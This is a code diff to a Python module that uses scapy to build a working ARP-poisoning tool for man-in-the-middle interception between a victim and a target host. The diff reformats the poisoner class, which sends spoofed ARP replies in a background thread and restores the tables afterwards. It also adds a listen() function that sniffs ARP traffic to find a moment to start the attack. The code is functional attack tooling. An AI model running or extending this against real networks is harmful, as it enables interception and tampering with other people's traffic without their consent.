@@ -2,7 +2,13 @@
 import threading
 import time
 
-from scapy.all import ARP, Ether, sendp, srp # pylint: disable=no-name-in-module,import-error
+from scapy.all import (
+    ARP,
+    Ether,
+    sendp,
+    srp,
+    sniff,
+)  # pylint: disable=no-name-in-module,import-error
 
 
 def resolve_mac(ip: str, iface: str) -> str:
@@ -26,7 +32,9 @@ class ARPPoisoner:
     Minimal ARP poisoner for victim <-> target MITM.
     """
 
-    def __init__(self, iface: str, victim_ip: str, target_ip: str, interval: float = 2.0):
+    def __init__(
+        self, iface: str, victim_ip: str, target_ip: str, interval: float = 2.0
+    ):
         self.iface = iface
         self.victim_ip = victim_ip
         self.target_ip = target_ip
@@ -37,7 +45,6 @@ class ARPPoisoner:
 
         self._running = False
         self._thread: threading.Thread | None = None
-
 
     def _poison_once(self) -> None:
         # Tell victim: "target_ip is at attacker MAC"
@@ -60,7 +67,6 @@ class ARPPoisoner:
         )
         sendp(eth_to_target / pkt_to_target, iface=self.iface, verbose=False)
 
-
     def _restore(self) -> None:
         print("[*] Restoring ARP tables...")
         correct_to_victim = ARP(
@@ -82,7 +88,6 @@ class ARPPoisoner:
             sendp(correct_to_target, iface=self.iface, verbose=False)
         print("[+] ARP tables restored")
 
-
     def _loop(self) -> None:
         """Background poisoning loop. Runs in its own thread."""
         print(
@@ -99,7 +104,6 @@ class ARPPoisoner:
             self._restore()
             print("[*] ARP poisoning thread exiting.")
 
-
     def start(self) -> None:
         """Start ARP poisoning in a background thread."""
         if self._running:
@@ -110,7 +114,6 @@ class ARPPoisoner:
         self._thread = threading.Thread(target=self._loop, daemon=True)
         self._thread.start()
 
-
     def stop(self) -> None:
         """Request poisoning to stop; thread will restore ARP and exit."""
         if not self._running:
@@ -118,8 +121,24 @@ class ARPPoisoner:
         print("[*] Stopping ARP poisoning...")
         self._running = False
 
-
     def join(self, timeout: float | None = None) -> None:
         """Optionally wait for the background thread to finish."""
         if self._thread is not None:
             self._thread.join(timeout)
+
+
+def listen(
+    victim_ip: str, target_ip: str, iface=["eth0", "eth1"]
+) -> ARPPoisoner | None:
+    """Listens for incoming ARP packets and checks if the packets originate from the target and are addressed to our victim"""
+    while True:
+        # Wait for an ARP packet
+        pkt = sniff(iface=iface, filter="arp", count=1)
+
+        # Extract ARP protocol information
+        sniffed = pkt[0][ARP]
+
+        # Determine whether or not this packet is useful to the attack
+        if sniffed.psrc == victim_ip and sniffed.pdst == target_ip:
+            # If so, return an instance that can be used to poison our target and victim
+            return ARPPoisoner(iface=iface, victim_ip=victim_ip, target_ip=target_ip)
